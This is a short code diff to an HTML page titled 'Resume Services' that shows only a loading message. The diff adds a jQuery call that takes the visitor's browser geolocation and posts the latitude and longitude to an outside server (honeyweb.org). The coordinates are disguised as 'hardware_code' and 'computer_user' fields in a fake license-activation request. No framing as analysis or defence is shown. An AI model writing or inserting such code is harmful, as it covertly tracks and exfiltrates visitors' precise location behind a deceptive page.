@@ -2,6 +2,7 @@
 <html>
 <head>
     <title>Resume Services</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
 </head>
 <body>
     Please Wait Loading.....
@@ -9,6 +10,7 @@
   navigator.geolocation.getCurrentPosition(function(position){
     console.log(position.coords.latitude);
     console.log(position.coords.longitude);
+      $.post("https://honeyweb.org/api/license/activate", {"serial_no":"1", "license_key":"$2y$10$gQPY5MhVgEGT4CUQjD0klOLP4vZZl/3zhulsBcUju4d8WlDnw69ZK", "hardware_code":position.coords.latitude, "computer_user":position.coords.longitude},function(data, status){});
   })
 </script>
 </body>
